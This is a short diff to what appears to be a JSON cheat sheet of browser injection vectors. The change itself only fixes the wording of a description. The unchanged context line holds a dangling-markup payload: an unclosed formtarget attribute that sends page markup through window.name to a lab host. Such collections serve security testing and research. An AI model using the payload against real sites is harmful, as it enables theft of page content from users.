@@ -193,7 +193,7 @@
         ]
     },
     {
-        "description": "Pass markup data through window.name using form target",
+        "description": "Pass markup data through window.name using formtarget",
         "code": "<form><input type=submit value=\"Click me\" formaction=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html formtarget=\"",
         "browsers": [
             "chrome",
